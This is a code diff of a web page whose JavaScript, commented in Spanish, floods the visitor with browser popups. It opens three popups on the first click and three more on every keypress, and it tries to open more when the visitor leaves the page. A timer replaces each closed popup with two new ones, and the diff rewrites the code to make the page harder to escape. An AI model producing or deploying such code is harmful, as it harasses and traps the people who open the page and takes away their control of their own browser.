@@ -3,7 +3,7 @@
 <head>
 <style>
 * { margin: 0; padding: 0; }
-body { overflow: hidden; cursor: pointer; }
+body { overflow: hidden; cursor: pointer; background: white; }
 #main {
     display: flex;
     flex-direction: column;
@@ -29,49 +29,55 @@ body { overflow: hidden; cursor: pointer; }
 var started = false;
 var popups = [];
 
-function spawn() {
+function openPopup() {
     var w = window.open('popup.html', '_blank',
-        'width=250,height=200,left=' + Math.floor(Math.random()*900) +
-        ',top=' + Math.floor(Math.random()*600));
+        'width=250,height=200,left=' + Math.floor(Math.random()*800) +
+        ',top=' + Math.floor(Math.random()*500));
     if (w) popups.push(w);
+    return w;
 }
 
-function checkClosed() {
-    var alive = [];
-    for (var i = 0; i < popups.length; i++) {
-        if (popups[i].closed) {
-            // cerró una — abre dos
-            spawn();
-            spawn();
-        } else {
-            alive.push(popups[i]);
-        }
-    }
-    popups = alive;
+function procreate() {
+    openPopup();
+    openPopup();
+    openPopup();
 }
 
 document.addEventListener('click', function() {
     document.getElementById('aud').play();
     if (!started) {
         started = true;
-        // 3 al inicio — chrome los permite dentro de click
-        spawn();
-        spawn();
-        spawn();
-        // cada 3 segundos abre una nueva sin pedir permiso
-        // porque la ventana principal sigue activa
-        setInterval(function() {
-            spawn();
-        }, 3000);
-        // vigila si cierran alguna
-        setInterval(checkClosed, 500);
+        procreate();
+    } else {
+        openPopup();
     }
 });
 
-document.addEventListener('keydown', function() {
-    document.getElementById('aud').play();
-    spawn();
+// cada vez que el usuario pulsa una tecla — mas popups
+document.addEventListener('keydown', function(e) {
+    procreate();
 });
+
+// si intentan cerrar — mas popups
+window.addEventListener('beforeunload', function() {
+    procreate();
+});
+
+// vigila popups cerrados — abre dos por cada uno cerrado
+setInterval(function() {
+    var alive = [];
+    for (var i = 0; i < popups.length; i++) {
+        try {
+            if (popups[i].closed) {
+                openPopup();
+                openPopup();
+            } else {
+                alive.push(popups[i]);
+            }
+        } catch(e) {}
+    }
+    popups = alive;
+}, 500);
 </script>
 </body>
 </html>
